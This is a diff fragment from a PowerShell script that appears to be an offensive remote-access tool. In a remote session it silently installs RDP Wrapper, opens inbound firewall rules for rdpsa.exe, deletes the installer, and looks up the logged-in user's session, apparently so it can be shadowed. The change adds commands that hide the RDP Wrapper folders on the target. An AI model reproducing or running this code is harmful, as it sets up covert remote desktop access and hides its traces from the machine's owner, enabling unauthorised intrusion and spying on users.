@@ -329,7 +329,7 @@ if($Language -in 'Spanish') {
     msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 1> $null
     netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
     netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
-    sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2> $null } 
+    attrib +h 'C:\Program Files\RDP Wrapper' ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 1>$null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2> $null } 
     
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host "" ; Write-Host "$txt25" ; sleep -milliseconds 2000 
